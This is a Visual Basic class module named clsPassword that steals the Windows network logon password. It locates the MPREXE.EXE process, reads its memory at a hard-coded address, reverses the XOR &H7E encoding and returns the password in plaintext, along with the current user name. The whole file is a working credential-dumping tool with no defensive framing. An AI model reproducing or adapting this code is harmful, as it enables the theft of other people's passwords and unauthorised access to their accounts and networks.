VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "clsPassword"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
'API

'user name
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function WNetGetUser Lib "mpr" Alias "WNetGetUserA" (ByVal lpName As String, ByVal lpUserName As String, lpnLength As Long) As Long

'memory reading
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByVal lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByVal lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

'enum processes
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, lProcessID As Long) As Long

'const
Private Const TH32CS_SNAPPROCESS As Long = 2&
Private Const PROCESS_VM_READ As Long = &H10
Private Const PROCESS_MPREXE As String = "MPREXE.EXE" 'this is our target
Private Const NO_ERROR As Long = 0

'type for enum processes
Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szexeFile As String * 260
End Type

'this function looks for MprExe.exe
'the return value is PID or -1(we didn't find it}

Private Function FindProcessPID() As Long
On Error GoTo ERROR

Dim myProcess As PROCESSENTRY32
Dim mySnapshot As Long

    'first initialization
    myProcess.dwSize = Len(myProcess)
    mySnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    ProcessFirst mySnapshot, myProcess
    
    'first process
    If InStr(UCase(myProcess.szexeFile), PROCESS_MPREXE) > 0 Then
        'we found it
        FindProcessPID = myProcess.th32ProcessID
        'so exit
        Exit Function
    End If
        
    'trying to find process
    While ProcessNext(mySnapshot, myProcess)
        If InStr(UCase(myProcess.szexeFile), PROCESS_MPREXE) > 0 Then
            'found
            FindProcessPID = myProcess.th32ProcessID
            Exit Function
        End If
    Wend
    
    'we did not find process
    FindProcessPID = -1

Exit Function

ERROR:
    'error
    FindProcessPID = -1
End Function

'decrypt the password
'return value is password in plaintext or "-1"

Private Function Decrypt(sCo As String) As String
On Error GoTo ERROR

Dim sTemp As String, i As Integer
    
    'password is crypted in memory with XOR &H7E
 
    sTemp = ""

    'this loop decrypt the password
    For i = 1 To Len(sCo)
        sTemp = sTemp & Chr((&H7E Xor Asc((Mid(sCo, i, 1)))))
    Next i

    Decrypt = sTemp

Exit Function

ERROR:
    'error
    Decrypt = "-1"
End Function

'returns username or "-1"

Public Function GetUserName1() As String
On Error GoTo ERROR

Dim sUziv As String, bRet As Boolean, lDelka As Long
    'some ini stuff
    lDelka = 128
    sUziv = Space(lDelka)
        
    bRet = CBool(GetUserName(sUziv, lDelka))
    'API failed
    If bRet = False Then GoTo ERROR
    
    'cut the name
    GetUserName1 = Left(sUziv, ((InStr(sUziv, Chr(0)) - 1)))

Exit Function

ERROR:
    'error
    GetUserName1 = "-1"
End Function

'returns username or "-1"

Public Function GetUserName2() As String
On Error GoTo ERROR

Dim sName As String, lDelka As Long, lRet As Long
    'ini stuff
    lDelka = 128
    sName = Space(lDelka)
    
    lRet = WNetGetUser("", sName, lDelka)
    'API failed
    If lRet <> NO_ERROR Then GoTo ERROR
      
    'cut the zero char
    sName = Left(sName, ((InStr(sName, Chr(0)) - 1)))
    GetUserName2 = sName

Exit Function

ERROR:
    GetUserName2 = "-1"
End Function

'this is main function
'it returns password in plain text or -1 (error)

Public Function GetPassword() As String
On Error GoTo ERROR
    
Dim lPID As Long, lOpenProcess As Long, sCrypt As String * 128, sDecrypt As String
Dim sTemp As String

    'call function which finds process MPREXE.exe and returns PID
    lPID = FindProcessPID
    If lPID = -1 Then
        'function did not find process
        GetPassword = "-1"
        Exit Function
    End If
      
    'open process for reading
    lOpenProcess = OpenProcess(PROCESS_VM_READ, 0, lPID)
    If lOpenProcess = 0 Then
        'API failed
        GetPassword = "-1"
        Exit Function
    End If
    
    'and here is the point
    'the password is saved in this address -> &H7FAEA1B0
    'so just read it
    If CBool(ReadProcessMemory(lOpenProcess, &H7FAEA1B0, sCrypt, Len(sCrypt), 0)) = False Then
        'oh reading failed
        'free handle and exit
        CloseHandle lOpenProcess
        GetPassword = "-1"
        Exit Function
    End If

    'free handle
    CloseHandle lOpenProcess
    
    'cut the string
    sTemp = Left(sCrypt, ((InStr(sCrypt, Chr(0)) - 1)))
    'and test it
    If Len(sTemp) = 0 Then
        GetPassword = "-1"
        Exit Function
    End If
    
    'decrypt the password
    sDecrypt = Decrypt(sTemp)
    If sDecrypt = "-1" Then
        'error
        GetPassword = "-1"
        Exit Function
    End If
        
    'return password
    GetPassword = sDecrypt

Exit Function

ERROR:
    'free handle
    CloseHandle lOpenProcess
    GetPassword = "-1"
End Function


